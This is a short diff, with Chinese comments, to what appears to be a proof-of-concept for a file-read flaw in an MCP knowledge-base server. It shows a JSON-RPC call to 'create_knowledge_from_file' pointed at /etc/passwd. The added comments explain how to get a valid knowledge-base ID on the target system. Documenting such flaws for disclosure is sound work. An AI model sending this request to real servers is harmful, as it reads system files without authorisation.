@@ -106,6 +106,8 @@ types.Tool(
 import json
 
 # MCP tool call 请求 (通过 MCP 客户端发送)
+# 注: kb_id 需替换为目标系统中实际存在的知识库 ID
+# 可通过 MCP 的 list_knowledge_bases 工具获取有效 ID
 mcp_request = {
     "jsonrpc": "2.0",
     "id": 1,
@@ -113,7 +115,7 @@ mcp_request = {
     "params": {
         "name": "create_knowledge_from_file",
         "arguments": {
-            "kb_id": "valid-knowledge-base-id",
+            "kb_id": "<valid-knowledge-base-id>",
             "file_path": "/etc/passwd"  # 读取系统密码文件
         }
     }
